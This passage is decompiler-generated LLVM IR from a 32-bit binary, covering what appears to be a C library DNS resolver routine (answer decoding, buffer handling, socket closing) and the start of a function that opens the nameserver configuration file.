  br i1 %v4_10011254, label %dec_label_pc_1001125c, label %dec_label_pc_100114cc

dec_label_pc_1001125c:                            ; preds = %dec_label_pc_10011244
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10011260, label %dec_label_pc_100114cc, label %dec_label_pc_10011268

dec_label_pc_10011268:                            ; preds = %dec_label_pc_1001125c
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1001126c, label %dec_label_pc_10011274, label %dec_label_pc_100112dc

dec_label_pc_10011274:                            ; preds = %dec_label_pc_10011268
  %v0_10011274 = load i32, i32* %r17.global-to-local, align 4
  %v3_10011274 = icmp eq i32 %v0_10011274, 0
  br i1 %v3_10011274, label %dec_label_pc_1001127c, label %dec_label_pc_100112d0

dec_label_pc_1001127c:                            ; preds = %dec_label_pc_10011274
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10010fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v0_10011298 = call i32 @__pthread_return_void()
  %v0_100112a0 = call i32 @__pthread_return_0()
  %v3_100112a8 = load i32, i32* @global_var_1002e658.924, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v1_100112b4 = add i32 %v3_100112a8, -1
  store i32 %v1_100112b4, i32* %r29.global-to-local, align 4
  %v0_100112b8 = call i32 @__pthread_return_void()
  %v0_100112bc = load i32, i32* @r22, align 4
  %v2_100112bc = icmp slt i32 %v0_100112bc, %v1_100112b4
  br i1 %v2_100112bc, label %dec_label_pc_100112c4, label %dec_label_pc_100112d0

dec_label_pc_100112c4:                            ; preds = %dec_label_pc_1001127c
  %v1_100112c4 = add i32 %v0_100112bc, 1
  store i32 %v1_100112c4, i32* @r22, align 4
  %v0_100112c8 = load i32, i32* @r20, align 4
  store i32 %v0_100112c8, i32* @r25, align 4
  br label %dec_label_pc_10011540thread-pre-split.backedge

dec_label_pc_100112d0:                            ; preds = %dec_label_pc_1001127c, %dec_label_pc_10011274
  %v0_100112d0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10011304

dec_label_pc_100112dc:                            ; preds = %dec_label_pc_10011268
  br i1 %v3_100112dc, label %dec_label_pc_100112e4, label %dec_label_pc_100114cc

dec_label_pc_100112e4:                            ; preds = %dec_label_pc_100112dc
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_100112fc, label %dec_label_pc_100112f0

dec_label_pc_100112f0:                            ; preds = %dec_label_pc_100112e4
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001131c10 = load i32, i32* @r30, align 4
  store i32 %v0_1001131c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001130c

dec_label_pc_100112fc:                            ; preds = %dec_label_pc_100112e4
  %v0_100112fc = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10011304

dec_label_pc_10011304:                            ; preds = %dec_label_pc_100112d0, %dec_label_pc_100112fc
  %storemerge3 = phi i32 [ %v0_100112fc, %dec_label_pc_100112fc ], [ %v0_100112d0, %dec_label_pc_100112d0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_100112fc ], [ 1, %dec_label_pc_100112d0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10011304 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10011304, align 4
  br label %dec_label_pc_10011568

dec_label_pc_1001130c:                            ; preds = %dec_label_pc_100112f0, %dec_label_pc_1001130c
  %v0_1001131c14 = phi i32 [ %v0_1001131c10, %dec_label_pc_100112f0 ], [ %v0_1001131c, %dec_label_pc_1001130c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_100112f0 ], [ %v2_10011310, %dec_label_pc_1001130c ]
  store i32 268505872, i32* @lr, align 4
  %v2_1001130c = call i32 @__length_question(i32 %v0_1001131c14, i32 %storemerge213)
  %v0_10011310 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011310 = add i32 %v0_10011310, %v2_1001130c
  %v0_10011320.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10011310, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10011310, i32* @r4, align 4
  %v0_1001131c = load i32, i32* @r30, align 4
  store i32 %v0_1001131c, i32* @r3, align 4
  %v2_10011320 = icmp slt i32 %v0_10011320.pr, 1
  %v1_10011324 = add i32 %v0_10011320.pr, 1
  store i32 %v1_10011324, i32* %r29.global-to-local, align 4
  br i1 %v2_10011320, label %dec_label_pc_1001130c, label %dec_label_pc_1001132c

dec_label_pc_1001132c:                            ; preds = %dec_label_pc_1001130c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_100112e8, label %dec_label_pc_10011478, label %dec_label_pc_10011480

dec_label_pc_1001133c:                            ; preds = %dec_label_pc_10011478
  store i32 %v2_1001133c, i32* %r29.global-to-local, align 4
  %v0_10011340 = load i32, i32* @r30, align 4
  store i32 268505940, i32* @lr, align 4
  %v5_10011350 = call i32 @__decode_answer(i32 %v0_10011340, i32 %v0_10011344, i32 %v1_10011478, i32* nonnull %stack_var_-184)
  store i32 %v5_10011350, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10011350, -1
  br i1 %tmp64, label %dec_label_pc_10011374, label %dec_label_pc_1001135c

dec_label_pc_1001135c:                            ; preds = %dec_label_pc_1001133c
  %v0_1001135c = load i32, i32* @r24, align 4
  %v3_1001135c = icmp eq i32 %v0_1001135c, 0
  br i1 %v3_1001135c, label %dec_label_pc_100114cc, label %dec_label_pc_10011364

dec_label_pc_10011364:                            ; preds = %dec_label_pc_1001135c
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10011368, label %dec_label_pc_100114cc, label %dec_label_pc_10011480

dec_label_pc_10011374:                            ; preds = %dec_label_pc_1001133c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10011378 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10011378, label %dec_label_pc_1001141c, label %dec_label_pc_10011380

dec_label_pc_10011380:                            ; preds = %dec_label_pc_10011374
  %v0_10011380 = load i32, i32* @r31, align 4
  store i32 %v2_1001133c, i32* @r4, align 4
  %v1_10011388 = add i32 %v0_10011380, 28
  %v2_10011388 = inttoptr i32 %v1_10011388 to i32*
  %v3_10011388 = load i32, i32* %v2_10011388, align 4
  store i32 %v3_10011388, i32* %r0.global-to-local, align 4
  store i32 %v0_10011380, i32* @r3, align 4
  %v1_10011390 = add i32 %v0_10011380, 36
  %v2_10011390 = inttoptr i32 %v1_10011390 to i32*
  %v3_10011390 = load i32, i32* %v2_10011390, align 4
  store i32 %v3_10011390, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268506024, i32* @lr, align 4
  %v0_100113a4 = call i32 @memcpy()
  %v0_100113a8 = load i32, i32* @r31, align 4
  %v1_100113a8 = add i32 %v0_100113a8, 4
  %v2_100113a8 = inttoptr i32 %v1_100113a8 to i32*
  %v3_100113a8 = load i32, i32* %v2_100113a8, align 4
  %v3_100113ac = icmp eq i32 %v3_100113a8, 24
  br i1 %v3_100113ac, label %dec_label_pc_10011380.dec_label_pc_100113d0_crit_edge, label %dec_label_pc_100113b4

dec_label_pc_10011380.dec_label_pc_100113d0_crit_edge: ; preds = %dec_label_pc_10011380
  %v1_100113d0.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_100113d0

dec_label_pc_100113b4:                            ; preds = %dec_label_pc_10011380
  %v1_100113b4 = add i32 %v0_100113a8, 28
  %v2_100113b4 = inttoptr i32 %v1_100113b4 to i32*
  %v3_100113b4 = load i32, i32* %v2_100113b4, align 4
  store i32 %v3_100113b4, i32* %r0.global-to-local, align 4
  %v3_100113b8 = icmp eq i32 %v3_100113b4, 0
  br i1 %v3_100113b8, label %dec_label_pc_10011480, label %dec_label_pc_100113c0

dec_label_pc_100113c0:                            ; preds = %dec_label_pc_100113b4
  %v0_100113c0 = load i32, i32* %r16.global-to-local, align 4
  %v3_100113c0 = icmp eq i32 %v0_100113c0, 1
  br i1 %v3_100113c0, label %dec_label_pc_100113d0, label %dec_label_pc_100113c8

dec_label_pc_100113c8:                            ; preds = %dec_label_pc_100113c0
  %v3_100113c8 = icmp eq i32 %v0_100113c0, 28
  br i1 %v3_100113c8, label %dec_label_pc_100113d0, label %dec_label_pc_10011480

dec_label_pc_100113d0:                            ; preds = %dec_label_pc_10011380.dec_label_pc_100113d0_crit_edge, %dec_label_pc_100113c8, %dec_label_pc_100113c0
  %v1_100113d0 = phi i32 [ %v1_100113d0.pre, %dec_label_pc_10011380.dec_label_pc_100113d0_crit_edge ], [ 28, %dec_label_pc_100113c8 ], [ 1, %dec_label_pc_100113c0 ]
  %v4_100113d0 = icmp eq i32 %v3_100113a8, %v1_100113d0
  br i1 %v4_100113d0, label %dec_label_pc_100113e4, label %dec_label_pc_100113d8

dec_label_pc_100113d8:                            ; preds = %dec_label_pc_100113d0
  %v1_100113d8 = inttoptr i32 %v0_100113a8 to i32*
  %v2_100113d8 = load i32, i32* %v1_100113d8, align 4
  store i32 %v2_100113d8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100113e0.932 to i32), i32* @lr, align 4
  %v0_100113dc = call i32 @free()
  br label %dec_label_pc_10011464

dec_label_pc_100113e4:                            ; preds = %dec_label_pc_100113d0
  %v1_100113e8 = add i32 %v0_100113a8, 16
  %v2_100113e8 = inttoptr i32 %v1_100113e8 to i32*
  %v3_100113e8 = load i32, i32* %v2_100113e8, align 4
  store i32 %v3_100113e8, i32* %r11.global-to-local, align 4
  %v0_100113ec = load i32, i32* @r24, align 4
  %v2_100113ec = sub i32 %tmp35, %v0_100113ec
  %v1_100113f0 = add i32 %v0_100113a8, 32
  %v2_100113f0 = inttoptr i32 %v1_100113f0 to i32*
  %v3_100113f0 = load i32, i32* %v2_100113f0, align 4
  store i32 %v3_100113f0, i32* %r0.global-to-local, align 4
  %v1_100113f4 = add i32 %v2_100113ec, -1
  %v1_100113f8 = add i32 %v3_100113e8, 4
  %v2_100113fc = mul i32 %v1_100113f4, %v1_100113f8
  store i32 %v2_100113fc, i32* %r11.global-to-local, align 4
  %v2_10011400 = add i32 %v0_100113a8, 36
  %v3_10011400 = inttoptr i32 %v2_10011400 to i32*
  store i32 %v1_100113f4, i32* %v3_10011400, align 4
  %v0_10011404 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011404 = load i32, i32* %r0.global-to-local, align 4
  %v3_10011404 = icmp ugt i32 %v0_10011404, %v1_10011404
  br i1 %v3_10011404, label %dec_label_pc_10011480, label %dec_label_pc_1001140c

dec_label_pc_1001140c:                            ; preds = %dec_label_pc_100113e4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10011414 = load i32, i32* @r31, align 4
  %v2_10011414 = add i32 %v1_10011414, 36
  %v3_10011414 = inttoptr i32 %v2_10011414 to i32*
  store i32 0, i32* %v3_10011414, align 4
  br label %dec_label_pc_10011464

dec_label_pc_1001141c:                            ; preds = %dec_label_pc_10011374
  %v3_1001141c = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1001141c, i32* @r3, align 4
  store i32 268506148, i32* @lr, align 4
  %v0_10011420 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10011428 = load i32, i32* %r16.global-to-local, align 4
  %v4_10011428 = icmp eq i32 %tmp29, %v1_10011428
  br i1 %v4_10011428, label %dec_label_pc_10011430, label %dec_label_pc_10011464

dec_label_pc_10011430:                            ; preds = %dec_label_pc_1001141c
  %v0_10011430 = load i32, i32* @r31, align 4
  %v1_10011430 = add i32 %v0_10011430, 16
  %v2_10011430 = inttoptr i32 %v1_10011430 to i32*
  %v3_10011430 = load i32, i32* %v2_10011430, align 4
  store i32 %v3_10011430, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10011438 = icmp eq i32 %v3_10011430, %tmp28
  br i1 %v4_10011438, label %dec_label_pc_10011440, label %dec_label_pc_100114c4

dec_label_pc_10011440:                            ; preds = %dec_label_pc_10011430
  %v1_10011440 = add i32 %v0_10011430, 36
  %v2_10011440 = inttoptr i32 %v1_10011440 to i32*
  %v3_10011440 = load i32, i32* %v2_10011440, align 4
  %v1_10011444 = add i32 %v0_10011430, 28
  %v2_10011444 = inttoptr i32 %v1_10011444 to i32*
  %v3_10011444 = load i32, i32* %v2_10011444, align 4
  store i32 %v3_10011444, i32* %r0.global-to-local, align 4
  %v2_10011448 = mul i32 %v3_10011440, %tmp28
  %v2_10011450 = add i32 %v3_10011444, %v2_10011448
  store i32 %v2_10011450, i32* @r3, align 4
  store i32 268506200, i32* @lr, align 4
  %v0_10011454 = call i32 @memcpy()
  %v0_10011458 = load i32, i32* @r31, align 4
  %v1_10011458 = add i32 %v0_10011458, 36
  %v2_10011458 = inttoptr i32 %v1_10011458 to i32*
  %v3_10011458 = load i32, i32* %v2_10011458, align 4
  %v1_1001145c = add i32 %v3_10011458, 1
  store i32 %v1_1001145c, i32* %v2_10011458, align 4
  br label %dec_label_pc_10011464

dec_label_pc_10011464:                            ; preds = %dec_label_pc_1001141c, %dec_label_pc_1001140c, %dec_label_pc_100113d8, %dec_label_pc_10011440
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10011440 ], [ 0, %dec_label_pc_1001141c ], [ 0, %dec_label_pc_1001140c ], [ %stack_var_-88.118, %dec_label_pc_100113d8 ]
  %v0_10011464 = load i32, i32* @r28, align 4
  %v1_10011464 = load i32, i32* %r15.global-to-local, align 4
  %v2_10011464 = add i32 %v1_10011464, %v0_10011464
  store i32 %v2_10011464, i32* %r28.global-to-local, align 4
  %v0_10011468 = load i32, i32* @r24, align 4
  %v1_10011468 = add i32 %v0_10011468, 1
  store i32 %v1_10011468, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10011470 = icmp slt i32 %v1_10011468, %tmp35
  br i1 %v2_10011470, label %dec_label_pc_10011478, label %dec_label_pc_10011480

dec_label_pc_10011478:                            ; preds = %dec_label_pc_1001132c, %dec_label_pc_10011464
  %v0_10011344 = phi i32 [ %v2_10011464, %dec_label_pc_10011464 ], [ %v2_10011310, %dec_label_pc_1001132c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10011464 ], [ 1, %dec_label_pc_1001132c ]
  %v1_10011478 = load i32, i32* @r27, align 4
  %v2_10011478 = icmp slt i32 %v0_10011344, %v1_10011478
  br i1 %v2_10011478, label %dec_label_pc_1001133c, label %dec_label_pc_10011480

dec_label_pc_10011480:                            ; preds = %dec_label_pc_10011364, %dec_label_pc_1001132c, %dec_label_pc_10011478, %dec_label_pc_100113b4, %dec_label_pc_100113e4, %dec_label_pc_10011464, %dec_label_pc_100113c8
  %v0_10011480 = load i32, i32* @r19, align 4
  store i32 268506248, i32* @lr, align 4
  %v1_10011484 = call i32 @__libc_close(i32 %v0_10011480)
  %v3_1001148c = icmp eq i32 %arg5, 0
  %v0_1001149c = load i32, i32* @r30, align 4
  br i1 %v3_1001148c, label %dec_label_pc_1001149c, label %dec_label_pc_10011494

dec_label_pc_10011494:                            ; preds = %dec_label_pc_10011480
  %v2_10011494 = inttoptr i32 %arg5 to i32*
  store i32 %v0_1001149c, i32* %v2_10011494, align 4
  br label %dec_label_pc_100114a4

dec_label_pc_1001149c:                            ; preds = %dec_label_pc_10011480
  store i32 %v0_1001149c, i32* @r3, align 4
  store i32 268506276, i32* @lr, align 4
  %v0_100114a0 = call i32 @free()
  br label %dec_label_pc_100114a4

dec_label_pc_100114a4:                            ; preds = %dec_label_pc_10011494, %dec_label_pc_1001149c
  %v0_100114a4 = load i32, i32* @r21, align 4
  store i32 %v0_100114a4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268506288, i32* @lr, align 4
  %v0_100114ac = call i32 @free()
  store i32 ptrtoint (i32* @global_var_10034890.920 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100115a8

dec_label_pc_100114c4:                            ; preds = %dec_label_pc_10011430
  %v1_100114c4 = inttoptr i32 %v0_10011430 to i32*
  %v2_100114c4 = load i32, i32* %v1_100114c4, align 4
  store i32 %v2_100114c4, i32* @r3, align 4
  store i32 268506316, i32* @lr, align 4
  %v0_100114c8 = call i32 @free()
  br label %dec_label_pc_100114cc

dec_label_pc_100114cc:                            ; preds = %dec_label_pc_100112dc, %dec_label_pc_10011244, %dec_label_pc_10011364, %dec_label_pc_1001135c, %dec_label_pc_1001125c, %dec_label_pc_10011224, %dec_label_pc_100114c4
  %v0_100114cc = load i32, i32* %r17.global-to-local, align 4
  %v3_100114cc = icmp eq i32 %v0_100114cc, 0
  br i1 %v3_100114cc, label %dec_label_pc_100114d4, label %dec_label_pc_10011524

dec_label_pc_100114d4:                            ; preds = %dec_label_pc_100114cc
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10010fd8, i32* %r28.global-to-local, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v0_100114f0 = call i32 @__pthread_return_void()
  %v0_100114f8 = call i32 @__pthread_return_0()
  %v3_10011500 = load i32, i32* @global_var_1002e658.924, align 4
  store i32 %v2_10010fd8, i32* @r3, align 4
  %v1_1001150c = add i32 %v3_10011500, -1
  store i32 %v1_1001150c, i32* %r29.global-to-local, align 4
  %v0_10011510 = call i32 @__pthread_return_void()
  %v0_10011514 = load i32, i32* @r22, align 4
  %v2_10011514 = icmp slt i32 %v0_10011514, %v1_1001150c
  br i1 %v2_10011514, label %dec_label_pc_1001151c, label %dec_label_pc_10011524

dec_label_pc_1001151c:                            ; preds = %dec_label_pc_100114d4
  %v1_1001151c = add i32 %v0_10011514, 1
  store i32 %v1_1001151c, i32* @r22, align 4
  br label %dec_label_pc_10011540thread-pre-split.backedge

dec_label_pc_10011540thread-pre-split.backedge:   ; preds = %dec_label_pc_1001151c, %dec_label_pc_100112c4, %dec_label_pc_1001153c
  %v0_10011540.pr = load i32, i32* %r18.global-to-local, align 4
  %tmp65 = icmp ult i32 %v0_10011540.pr, 3
  br i1 %tmp65, label %dec_label_pc_10011034.lr.ph, label %dec_label_pc_10011558

dec_label_pc_10011524:                            ; preds = %dec_label_pc_100111d4, %dec_label_pc_100114d4, %dec_label_pc_100114cc, %dec_label_pc_100111ec
  %v0_10011524 = load i32, i32* @r26, align 4
  %v1_10011524 = add i32 %v0_10011524, 1
  store i32 %v1_10011524, i32* %r0.global-to-local, align 4
  %v1_10011528 = load i32, i32* @r23, align 4
  %v2_10011528 = srem i32 %v1_10011524, %v1_10011528
  store i32 %v2_10011528, i32* @r26, align 4
  %v5_10011530 = icmp eq i32 %v2_10011528, 0
  br i1 %v5_10011530, label %dec_label_pc_10011538, label %dec_label_pc_1001153c

dec_label_pc_10011538:                            ; preds = %dec_label_pc_10011524
  %v0_10011538 = load i32, i32* %r18.global-to-local, align 4
  %v1_10011538 = add i32 %v0_10011538, 1
  store i32 %v1_10011538, i32* %r18.global-to-local, align 4
  br label %dec_label_pc_1001153c

dec_label_pc_1001153c:                            ; preds = %dec_label_pc_10011524, %dec_label_pc_10011538
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10011540thread-pre-split.backedge

dec_label_pc_10011034.lr.ph:                      ; preds = %dec_label_pc_10011034.lr.ph.lr.ph, %dec_label_pc_10011540thread-pre-split.backedge
  br label %dec_label_pc_10011034

dec_label_pc_1001154c:                            ; preds = %dec_label_pc_10010fac, %dec_label_pc_10010fa4, %dec_label_pc_10010f9c, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10011558

dec_label_pc_10011558:                            ; preds = %dec_label_pc_10011540thread-pre-split.backedge, %dec_label_pc_10011044, %dec_label_pc_10011120, %dec_label_pc_100111e4, %dec_label_pc_10010fb8, %dec_label_pc_1001154c
  %v0_10011558 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10011560 = inttoptr i32 %v0_10011558 to i32*
  store i32 -1, i32* %v2_10011560, align 4
  %v0_10011564 = load i32, i32* @r25, align 4
  store i32 %v0_10011564, i32* @r20, align 4
  br label %dec_label_pc_10011568

dec_label_pc_10011568:                            ; preds = %dec_label_pc_10011304, %dec_label_pc_10011558
  %v0_10011568 = load i32, i32* @r19, align 4
  %v3_10011568 = icmp eq i32 %v0_10011568, -1
  br i1 %v3_10011568, label %dec_label_pc_10011578, label %dec_label_pc_10011570

dec_label_pc_10011570:                            ; preds = %dec_label_pc_10011568
  store i32 268506488, i32* @lr, align 4
  %v1_10011574 = call i32 @__libc_close(i32 %v0_10011568)
  br label %dec_label_pc_10011578

dec_label_pc_10011578:                            ; preds = %dec_label_pc_10011568, %dec_label_pc_10011570
  %v0_10011578 = load i32, i32* @r21, align 4
  store i32 %v0_10011578, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268506500, i32* @lr, align 4
  %v0_10011580 = call i32 @free()
  %v0_10011584 = load i32, i32* @r30, align 4
  store i32 %v0_10011584, i32* @r3, align 4
  store i32 268506508, i32* @lr, align 4
  %v0_10011588 = call i32 @free()
  %v0_1001158c = load i32, i32* @r26, align 4
  %v3_1001158c = icmp eq i32 %v0_1001158c, -1
  br i1 %v3_1001158c, label %dec_label_pc_100115d8, label %dec_label_pc_10011594

dec_label_pc_10011594:                            ; preds = %dec_label_pc_10011578
  store i32 ptrtoint (i32* @global_var_10034890.920 to i32), i32* %r29.global-to-local, align 4
  %v2_100115a0 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_100115a8

dec_label_pc_100115a8:                            ; preds = %dec_label_pc_100114a4, %dec_label_pc_10011594
  %storemerge68 = phi i32 [ %v2_100115a0, %dec_label_pc_10011594 ], [ %v2_10010fd8, %dec_label_pc_100114a4 ]
  %v1_100115ac.pre-phi = phi i32 [ %v2_100115a0, %dec_label_pc_10011594 ], [ %v2_10010fd8, %dec_label_pc_100114a4 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  store i32 %v1_100115ac.pre-phi, i32* @r3, align 4
  %v0_100115b0 = call i32 @__pthread_return_void()
  %v0_100115b8 = call i32 @__pthread_return_0()
  %v0_100115c0 = load i32, i32* @r26, align 4
  store i32 %v0_100115c0, i32* @global_var_1002e650.921, align 4
  store i32 %v1_100115ac.pre-phi, i32* @r3, align 4
  %v0_100115d0 = load i32, i32* @r20, align 4
  %v1_100115d0 = trunc i32 %v0_100115d0 to i16
  store i16 %v1_100115d0, i16* @global_var_1002e56c.922, align 2
  %v0_100115d4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100115d8

dec_label_pc_100115d8:                            ; preds = %dec_label_pc_10011578, %dec_label_pc_100115a8
  store i32 %v0_10010f58, i32* %r0.global-to-local, align 4
  %v0_100115dc = load i32, i32* @r27, align 4
  ret i32 %v0_100115dc

; uselistorder directives
  uselistorder i32 %v1_100115ac.pre-phi, { 1, 0 }
  uselistorder i32 %v2_10011528, { 1, 0 }
  uselistorder i32 %v0_1001149c, { 1, 0 }
  uselistorder i32 %v1_10011478, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10011344, { 1, 0 }
  uselistorder i32 %v1_10011468, { 1, 0 }
  uselistorder i32 %v0_10011430, { 0, 2, 1, 3 }
  uselistorder i32 %v1_100113f4, { 1, 0 }
  uselistorder i32 %v0_10011380, { 2, 1, 0 }
  uselistorder i32 %v0_1001131c, { 1, 0 }
  uselistorder i32 %v2_10011310, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10011234, { 1, 0 }
  uselistorder i32 %v1_10011134, { 1, 0 }
  uselistorder i32 %v1_10011108, { 1, 0 }
  uselistorder i32 %v1_100110d4, { 1, 0 }
  uselistorder i32 %v1_1001106c, { 1, 0 }
  uselistorder i32 %v2_10010fd8, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 101, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 5, 4, 3, 6, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 2, 9, 8, 7, 0, 6, 5, 4, 3, 10, 1 }
  uselistorder i32 17, { 2, 3, 14, 4, 17, 18, 5, 19, 6, 7, 8, 9, 10, 22, 23, 15, 16, 20, 11, 0, 1, 12, 13, 21 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 53, { 2, 0, 1, 3 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 25, 24, 23, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16* @global_var_1002e56c.922, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 7, 0, 4, 5, 6 }
  uselistorder i32 512, { 2, 6, 0, 1, 7, 3, 4, 5 }
  uselistorder label %dec_label_pc_100115d8, { 1, 0 }
  uselistorder label %dec_label_pc_100115a8, { 1, 0 }
  uselistorder label %dec_label_pc_10011578, { 1, 0 }
  uselistorder label %dec_label_pc_10011568, { 1, 0 }
  uselistorder label %dec_label_pc_10011558, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10011034.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001153c, { 1, 0 }
  uselistorder label %dec_label_pc_10011524, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10011540thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100114cc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_100114a4, { 1, 0 }
  uselistorder label %dec_label_pc_10011480, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10011478, { 1, 0 }
  uselistorder label %dec_label_pc_10011464, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100113d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001130c, { 1, 0 }
  uselistorder label %dec_label_pc_10011304, { 1, 0 }
  uselistorder label %dec_label_pc_100111a8, { 1, 0 }
  uselistorder label %dec_label_pc_10011120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011044, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10011610 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10011610, i32* @r3, align 4
  %v0_10011618 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002e570.869 to i32), i32* %r3.global-to-local, align 4
  %v0_10011620 = call i32 @__pthread_return_0()
  store i32 %v0_10011620, i32* %r3.global-to-local, align 4
  %v3_10011628 = load i32, i32* @global_var_1002e654.870, align 4
  %v2_1001162c = icmp sgt i32 %v3_10011628, 0
  br i1 %v2_1001162c, label %dec_label_pc_100118a4, label %dec_label_pc_10011634

dec_label_pc_10011634:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1001d868.935 to i32), i32* %r3.global-to-local, align 4
  store i32 268506700, i32* @lr, align 4
  %v3_10011648 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1001d868.935 to i32), i32 ptrtoint (i32* @global_var_1001d87c.934 to i32))
  store i32 %v3_10011648, i32* %r3.global-to-local, align 4
  store i32 %v3_10011648, i32* @r26, align 4
  %v3_1001164c = icmp eq i32 %v3_10011648, 0
